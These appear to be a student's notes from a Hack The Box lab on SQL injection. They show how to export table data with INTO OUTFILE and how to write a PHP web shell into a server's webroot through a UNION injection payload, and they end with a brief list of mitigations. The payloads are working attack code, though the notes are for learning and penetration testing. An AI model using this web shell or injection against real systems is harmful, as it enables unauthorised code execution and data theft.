    To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the `users` table into the `/tmp/credentials` file:
    
    secure_file_priv
    
    ```
    SELECT * from users INTO OUTFILE '/tmp/credentials';
    ```
    
    If we go to the back-end server and `cat` the file, we see that table's content:
    
    secure_file_priv
    
    ```
    KareemAlsadeq@htb[/htb]$ cat /tmp/credentials 1       admin   392037dbba51f692776d6cefb6dd546d
    2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
    ```
    
    It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
    
    Code: sql
    
    ```
    SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
    ```
    
    When we `cat` the file, we see that text:
    
    secure_file_priv
    
    ```
    KareemAlsadeq@htb[/htb]$ cat /tmp/test.txt this is a test
    ```
    
    secure_file_priv
    
    ```
    KareemAlsadeq@htb[/htb]$ ls -la /tmp/test.txt -rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
    ```
    
    As we can see above, the `test.txt` file was created successfully and is owned by the `mysql` user.
    
    Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
    
      
    
      
    
    ## Writing a Web Shell:
    
    Having confiremed write permission we can write :
    
    - a PHP WebShell
    - at the webroot folder .
    - we can write the following php webshell to
    - be able to excute commands on the back server .
        
        ```
        <?php system($_REQUEST[0]);  ?>
        ```
        
    - and here is how we can write it in a file at the webroot folder via UNION command
    
    ```
    ' UNION select "",'<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/www/html/shell.php' -- -
    ```
    
    AS WE SAW the way of outfiling this file is just simplu by telling it after selecting we say
    
    put it (into) an out file (outfile) present in (/var/www/html/shell.php)
    
    select …… into outfile ‘place’
    
    - if we got nothing as a product then this will mean that it is done correctly .
    - and to access the file that we outfiled on the
        
        - /var/www/html/shell.php whcih is the webroot for this server we are implementing on .
        - we are going to use the [http://serverip](http://serverip):port/shell.php?
        
        in another way we just type slash and then the shell . php
        
          
        The output of the `id` command confirms that we have code execution and are running as the `www-data` user.
        
          
        

  

  

## Mitigation :

1. **Input Sanitization**
2. **Input Validation**
3. **User Privileges**
4. **Web Application Firewall (WAF)**
5. **Parameterized Queries**

  

  

  

  

  

  

  

[[pentesting INLANEFREIGHT site for a sql injection vulnerability]]